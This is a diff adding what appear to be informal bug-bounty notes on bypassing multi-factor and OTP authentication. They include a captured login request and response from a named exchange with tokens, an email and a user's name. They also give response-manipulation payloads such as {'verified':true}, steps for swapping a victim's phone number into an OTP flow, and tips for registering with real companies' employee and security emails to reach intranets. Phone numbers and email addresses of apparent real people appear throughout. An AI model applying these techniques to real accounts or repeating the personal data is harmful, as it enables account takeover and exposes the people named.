@@ -1,0 +1,196 @@
+  MFA bypass
+
+  1 . Login creds 
+  2 . OTP , Key : Time based , Version based , signature based , alphanumeric 
+   Time based: 7 seconds to maximum 10 min
+   Version based : Number with code symbol
+   Signature based  : G-5431354 , SA-536565
+   Alphanumeric : 534354AJHBKBCHKB
+
+
+
+   To bypass
+   1. Request
+   2. Response
+   3. Flow working
+
+Request:
+POST /login-2fa HTTP/1.1
+Host: user.bitaroo.com.au
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 185
+Origin: https://trade.bitaroo.com.au
+Connection: close
+Referer: https://trade.bitaroo.com.au/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+
+{"tfaToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZmFVc2VySWQiOjQwMzcsImlhdCI6MTY0MjMyNDUzMiwiZXhwIjoxNjQyMzI0ODMyfQ._SPvGdZ9uw4zQcajg_P7XJA7bqc2U_0ddxt_aDdsnp4","tfaCode":"310162"}
+
+
+
+
+Response :
+
+HTTP/1.1 200 OK
+Date: Sun, 16 Jan 2022 09:16:27 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 560
+Connection: close
+X-Powered-By: Express
+X-RateLimit-Limit: 30
+X-RateLimit-Remaining: 29
+X-RateLimit-Reset: 1642324648
+Access-Control-Allow-Origin: https://trade.bitaroo.com.au
+Vary: Origin, Accept-Encoding
+ETag: W/"230-s1vP7k4u5WUR2vrmcuBtG2GGHYE"
+
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQwMzcsInRva2VuIjoiaF9uSUJ0MnMiLCJpYXQiOjE2NDIzMjQ1ODd9.EorSVnp9YF1CXQOlpya9lDiQh_7NfjBcLwqt7H1kO8k","email":"hetef97425@leezro.com","firstName":"adity","lastName":"shende","takerFee":0.19,"makerFee":0.15,"emailVerified":1,"kyc":0,"kycLevel":0,"status":0,"settings":{"confirmNewOrder":1,"confirmCancelOrder":1,"showMarketDepth":0,"enLogin":1,"enIpChange":1,"enWrongPassword":1,"enPasswordChange":1,"enDeposit":1,"enWithdrawal":1,"enExpress":1,"enDca":1,"enDcaFailed":1,"enTrade":1},"tfaEnabled":true}
+
+200 OK
+
+JSON based bypass
+
+success 
+true
+verified
+valid
+1
+dashboard
+
+
+{"verified":true}
+{"success":true}
+
+
+
+   4. Token
+   5. Keyword based
+   6. Time based
+   7. Syntax based 
+
+   Function : Where we can test
+
+   1. OTP bypass
+   Login
+   Signup
+   Payment
+   Forget
+   Email verification
+
+   JSON
+
+   {"phone_number":"919049539676"}
+
+
+   1. Login
+   2. Enter valid OTP + Response = JSON syntax
+   3. Logout , Login = WRONG OTP = 400 BAD REQUEST
+   4. We chnaged status code 200 OK
+
+   {"verified":true}
+   {"success":true}
+   5. Bypassed
+
+   {“status”:”true”}
+success 
+true
+verified
+valid
+1
+dashboard
+
+
+{"verified":true}
+{"success":true}
+{"dashboard":1}
+{"valid":1}
+{"verfied":1}
+
+
+Victim
+7208420701
+
+Attacker
+8379887540
+
+
+
+1. Request based :
+OTPComRequired=true
+OTPCrmRequired=true
+FALSE 
+
+2. 2 numbers : Attacker , Victim
+Get OTP on attacker number
+Validated that 
+Validation response 
+Response disclosed attacker number
+Manipulated with victim number 
+2FA  bypass complete on victim acocunt
+
+
+Impact
+1. No use of OTP security
+2. Weak Server side validation
+3. Number disclosed in reponse
+
+
+
+Valid = 200 OK
+
+OTP is valid
+
+
+
+1. Intranet access
+
+Tips:
+1. If there is no verification on account register 
+2. create acount with org employee : jaasica_stobb@dell.com 
+
+Impact:
+1. You can get employee priv
+2. That emp won't able to create account
+
+
+security@target.com
+
+Token based 2fa bypass
+Intranet access
+Unauthorized
+
+
+api.dev.dell.com/register.php
+hunter.io
+
+
+1. Ask otp on your mail address : 
+2. Valid OTP and checked its response
+
+
+
+aditya@hackerera.com  
+OTP validation
+Response = 200 OK , Token belongs to aditya@hackerera.com 
+
+Try to register with security email : 
+OTP validation 
+400 Bad Request 
+Changed whole response with the response of aditya@hackersera.com including token
+signed in as security@flock.com
+
+
+
+Google Approach
+
+https://en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Alphabet
+https://www.google.com/appserve/security-bugs/m2/new?rl=&key=
+
+
+Validation : False / Positive
